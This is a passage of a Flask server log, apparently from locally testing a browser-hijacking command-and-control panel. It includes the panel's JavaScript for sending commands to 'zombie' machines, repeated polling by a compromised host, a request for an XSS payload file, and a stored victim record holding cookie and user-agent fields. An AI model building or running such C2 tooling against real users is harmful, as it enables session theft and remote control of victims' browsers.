class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 00:10:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:36] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 00:10:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:36] "GET /static/css/control_message.css HTTP/1.1" 200 -
2025-06-25 00:10:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:36] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-25 00:10:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:37] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:10:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:37 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:38 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:39 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:40 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:41 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:42 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:43 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:44 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:45 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:46 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:47 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:48 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:49 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:50 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:51 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:52 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:53 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:54 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:55 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:56 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:57 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:58 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:59 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:00 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:01 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:11:19 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:11:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:11:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:19] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:11:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:11:19 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:11:19 | ERROR    | control_route.py:68 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:11:19.716Z"}', None, '2025-06-25 00:11:19.718638', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:11:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:11:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:19] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:11:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:20 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:21 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:22 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:24 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:24 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:25 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:26 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:27 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:28 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:29 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:30 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:31 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:32 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:33 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:34 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:35 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:36 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:37 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:11:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:11:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:11:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:11:38 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:11:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
